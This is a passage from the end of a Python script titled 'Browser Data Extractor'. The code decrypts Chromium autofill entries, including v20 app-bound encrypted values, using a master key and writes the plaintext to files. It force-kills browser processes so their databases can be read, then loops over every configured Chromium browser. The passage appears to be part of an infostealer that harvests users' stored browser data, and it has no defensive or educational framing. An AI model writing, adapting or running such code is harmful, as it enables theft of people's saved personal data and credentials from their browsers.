                                if isinstance(value, bytes) and (value[:3] in (b"v10", b"v11", b"v20")):
                                    decrypted = decrypt_v20_value(value, master_key)
                                    value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                else:
                                    value_str = value
                                line = f"Field: {name}\nValue: {value_str}\n\n"
                                f.write(line)
                    log(f"  [Autofill] Extracted {len(autofills)} entries -> {autofill_file.name}")
                    con.close()
                    try: os.remove(db_copy)
                    except: pass
            else:
                log(f"  [Autofill] No webdata DB found at: {webdata_db_path}", "DEBUG")
        except Exception as e:
            log(f"  [Autofill] Error: {e}", "ERROR")

def kill_browser_processes():

    log("Killing browser processes to unlock DB files...")
    process_names = set()
    for config in BROWSERS.values():
        pname = config.get('process_name')
        if pname:
            process_names.add(pname)
    log(f"  Target processes: {sorted(process_names)}", "DEBUG")
    killed = 0
    for proc in process_names:
        try:
            result = subprocess.run(
                ['taskkill', '/F', '/IM', proc],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            if result.returncode == 0:
                log(f"  Killed: {proc}")
                killed += 1
            else:
                log(f"  Not running: {proc}", "DEBUG")
        except Exception as e:
            log(f"  Failed to kill {proc}: {e}", "WARNING")
    log(f"  Browser kill complete ({killed} processes terminated)")

if __name__ == "__main__":
    log(f"{'='*60}")
    log(f"Browser Data Extractor Starting")
    log(f"{'='*60}")
    log(f"Admin: {is_admin()}")
    log(f"User: {os.environ.get('USERNAME', 'unknown')}")
    log(f"Output: {OUTPUT_BASE_DIR}")
    log(f"Browsers configured: {len(BROWSERS)}")

    kill_browser_processes()

    chromium_browsers = {k: v for k, v in BROWSERS.items() if v.get('type') == 'chromium'}
    log(f"Processing {len(chromium_browsers)} Chromium-based browsers...")
    for name, config in BROWSERS.items():
        try:
            if config.get('type') == 'chromium':
                process_chromium_browser(name, config)
        except Exception as e:
            log(f"Error processing {name}: {e}", "ERROR")

    log(f"{'='*60}")
    log(f"Done!")
    log(f"{'='*60}")
